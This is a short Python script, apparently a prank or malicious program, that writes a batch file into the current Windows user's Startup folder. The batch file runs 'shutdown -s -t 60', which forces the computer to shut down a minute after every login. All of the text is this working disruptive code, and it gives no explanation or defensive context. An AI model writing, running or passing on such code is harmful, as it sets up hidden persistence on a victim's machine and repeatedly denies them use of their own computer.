import os

user = os.getlogin()

path = 'C:\\Users\\'+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\file.bat"

file = open(path, 'w')

file.write('shutdown -s -t 60')